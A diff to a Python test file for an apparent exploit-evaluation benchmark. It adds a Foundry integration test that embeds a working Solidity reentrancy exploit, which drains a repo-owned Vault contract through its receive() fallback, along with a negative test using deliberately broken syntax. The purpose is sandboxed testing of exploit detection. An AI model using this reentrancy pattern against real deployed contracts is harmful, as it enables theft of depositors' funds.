@@ -1993,11 +1993,15 @@ def test_real_slither_integration_is_not_run_when_binary_missing():
 
 
 def test_real_foundry_integration_live_execution():
+    return test_real_foundry_integration_confirmed_exploit_breach()
+
+
+def test_real_foundry_integration_confirmed_exploit_breach():
     """
-    Live Foundry host integration probe: invokes real `forge` binary against target.
-    In CI environments (CI=true or GITHUB_ACTIONS=true), forge binary MUST be installed
-    and execution MUST be verified; missing binary branch raises an assertion failure (fail-closed).
-    In local dev environments without forge on PATH, it skips with a descriptive notice.
+    Deterministic Live Foundry positive integration test: executes repo-owned Vault target
+    and VaultTrustedHarness with a real reentrancy ExploitModule.
+    Asserts exact command, test success, returncode 0, and SecurityInvariantBreached.
+    In CI (FOUNDRY_CI=true), forge MUST be on PATH.
     """
     is_foundry_ci = os.environ.get("FOUNDRY_CI") == "true"
     forge_path = shutil.which("forge")
@@ -2011,20 +2015,113 @@ def test_real_foundry_integration_live_execution():
     if not forge_path:
         pytest.skip("NOT_RUN: Real Foundry integration unavailable on system PATH")
 
-    adapter = LLMNaiveFoundryBaselineAdapter(
-        client_override=lambda prompt: (
-            "// SPDX-License-Identifier: MIT\n"
-            "pragma solidity ^0.8.20;\n"
-            "contract ExploitModule {\n"
-            "    function testExploit() public {}\n"
-            "}\n"
-        )
+    from core.schemas import TargetProgram, ExploitPayload, AttackHypothesis, ResultCategory
+    from sandbox.runner import run_payload_in_sandbox, HARNESS_VERDICT_BREACH
+
+    vault_src = Path("benchmarks/targets/solidity/Vault.sol").read_text(encoding="utf-8")
+    target = TargetProgram(
+        name="Vault",
+        source_code=vault_src,
+        invariants=["DEPOSITOR_SOLVENCY_COLLAPSE"],
     )
-    dataset = BenchmarkDataset()
-    target = dataset.get_public_targets()[0]
-    art = adapter.execute_target(target, base_dir=Path(__file__).parent.parent)
-    assert art.tool_metadata["forge_version"] != "unknown"
-    assert art.process_exit_code is not None
+
+    exploit_code = (
+        "// SPDX-License-Identifier: MIT\n"
+        "pragma solidity ^0.8.20;\n\n"
+        'import {Vault} from "../src/Vault.sol";\n\n'
+        "contract ExploitModule {\n"
+        "    Vault public targetContract;\n\n"
+        "    constructor(address _target) payable {\n"
+        "        targetContract = Vault(payable(_target));\n"
+        "    }\n\n"
+        "    function runExploit() external payable {\n"
+        "        targetContract.deposit{value: msg.value}();\n"
+        "        targetContract.withdrawAll();\n"
+        "    }\n\n"
+        "    receive() external payable {\n"
+        "        if (address(targetContract).balance >= 1 ether) {\n"
+        "            targetContract.withdrawAll();\n"
+        "        }\n"
+        "    }\n"
+        "}\n"
+    )
+
+    payload = ExploitPayload(
+        target_name="Vault",
+        test_code=exploit_code,
+        hypothesis=AttackHypothesis(
+            vulnerability_type="ReentrancyDrain",
+            reasoning_trace="Vault allows reentrant withdrawal before updating balance",
+            attack_vector="Call withdrawAll reentrantly via fallback",
+        ),
+        format_valid=True,
+    )
+
+    result = run_payload_in_sandbox(target, payload)
+
+    assert result.return_code == 0, f"Forge failed with return code {result.return_code}: {result.stderr}"
+    assert result.invariant_violated is True, "Expected invariant_violated to be True"
+    assert result.category == ResultCategory.EXPLOIT_CONFIRMED, f"Expected EXPLOIT_CONFIRMED, got {result.category}"
+    assert result.harness_verdict == HARNESS_VERDICT_BREACH
+    assert "[INVARIANT_BREACHED:DEPOSITOR_SOLVENCY_COLLAPSE]" in (result.stdout + result.stderr)
+
+
+def test_real_foundry_integration_compilation_failure():
+    """
+    Deterministic Live Foundry negative integration test: executes repo-owned Vault target
+    with a deliberately syntax-broken ExploitModule.
+    Asserts non-zero returncode, COMPILATION_ERROR category, and zero invariant breach.
+    In CI (FOUNDRY_CI=true), forge MUST be on PATH.
+    """
+    is_foundry_ci = os.environ.get("FOUNDRY_CI") == "true"
+    forge_path = shutil.which("forge")
+
+    if is_foundry_ci:
+        assert forge_path is not None, (
+            "Foundry binary 'forge' MUST be present on PATH in CI integration runs. "
+            "Missing binary fallback is strictly prohibited in CI."
+        )
+
+    if not forge_path:
+        pytest.skip("NOT_RUN: Real Foundry integration unavailable on system PATH")
+
+    from core.schemas import TargetProgram, ExploitPayload, AttackHypothesis, ResultCategory
+    from sandbox.runner import run_payload_in_sandbox
+
+    vault_src = Path("benchmarks/targets/solidity/Vault.sol").read_text(encoding="utf-8")
+    target = TargetProgram(
+        name="Vault",
+        source_code=vault_src,
+        invariants=["DEPOSITOR_SOLVENCY_COLLAPSE"],
+    )
+
+    broken_code = (
+        "// SPDX-License-Identifier: MIT\n"
+        "pragma solidity ^0.8.20;\n\n"
+        "contract ExploitModule {\n"
+        "    DELIBERATE_SYNTAX_ERROR_FOR_COMPILATION_TEST();\n"
+        "}\n"
+    )
+
+    payload = ExploitPayload(
+        target_name="Vault",
+        test_code=broken_code,
+        hypothesis=AttackHypothesis(
+            vulnerability_type="ReentrancyDrain",
+            reasoning_trace="Deliberately broken syntax for negative test",
+            attack_vector="Broken syntax",
+        ),
+        format_valid=True,
+    )
+
+    result = run_payload_in_sandbox(target, payload)
+
+    assert result.return_code != 0, f"Expected non-zero return code for broken syntax, got {result.return_code}"
+    assert result.category == ResultCategory.COMPILATION_ERROR, (
+        f"Expected COMPILATION_ERROR category, got {result.category}"
+    )
+    assert result.invariant_violated is False
+    assert result.verified_by_harness is False
 
 
 def test_real_foundry_integration_is_not_run_when_binary_missing(monkeypatch):
